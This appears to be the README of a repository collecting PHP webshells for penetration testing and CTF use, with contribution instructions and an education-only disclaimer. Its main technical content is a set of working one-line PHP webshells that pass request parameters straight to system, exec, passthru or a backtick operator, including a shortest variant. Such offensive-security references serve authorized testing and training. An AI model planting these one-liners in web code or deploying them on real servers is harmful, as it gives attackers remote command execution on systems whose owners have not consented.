============

To contribute other shells not listed here... Fork, Push the changes to your repo, then before you request for a Pull, make sure to include a simple description of your **php** web-shell and include a screen-shot of the web-shell (as hosted in your localhost).

PHP Webshells
=============

Common PHP shells is a collection of PHP webshells that you may need for your penetration testing (PT) cases or in a CTF challenge. 

Do not host any of the files on a publicly-accessible webserver (unless you know what you are up-to).

These are provided for education purposes only and legitimate PT cases.

I'll keep updating the collection whnever I stumble on any new webshell.

FYI
====


For basic features, I recommend one-liners like :

`<?php echo passthru($_GET['cmd']); ?>`

`<?php echo exec($_POST['cmd']); ?>`

`<?php system($_GET['cmd']); ?>`

`<?php passthru($_REQUEST['cmd']); ?>`

smallest one-liners
===
`` is  backtick character anything b/w this excute directly many developer unaware about this
'<?=`$_GET[C]`?>'
